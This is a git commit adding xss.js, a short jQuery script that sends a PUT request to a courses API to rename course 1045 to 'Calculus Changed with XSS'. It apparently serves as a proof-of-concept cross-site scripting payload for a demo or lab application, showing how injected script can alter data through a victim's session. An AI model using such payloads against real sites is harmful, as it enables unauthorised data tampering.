c683f410427da3c67226297e55c342b37d58be4d
tommie2002 <94382076+tommie2002@users.noreply.github.com>
2023-09-06 21:57:48 +0200

    Create xss.js

---
+++ xss.js
@@ -0,0 +1,24 @@
+ $.ajax({
+     headers: { 
+        'Accept': 'application/json',
+        'Content-Type': 'application/json' 
+    },
+                url: 'api/CoursesApi/1045/',
+                type: 'PUT',
+                dataType: 'json',
+                data: JSON.stringify({
+    "courseID": 1045,
+    "title": "Calculus Changed with XSS",
+    "credits": 4,
+    "departmentID": 3,
+    "department": null,
+    "enrollments": null,
+    "courseAssignments": null
+}),
+                success: function (data, textStatus, xhr) {
+                    console.log(data);
+                },
+                error: function (xhr, textStatus, errorThrown) {
+                    console.log('Error in Operation');
+                }
+            });
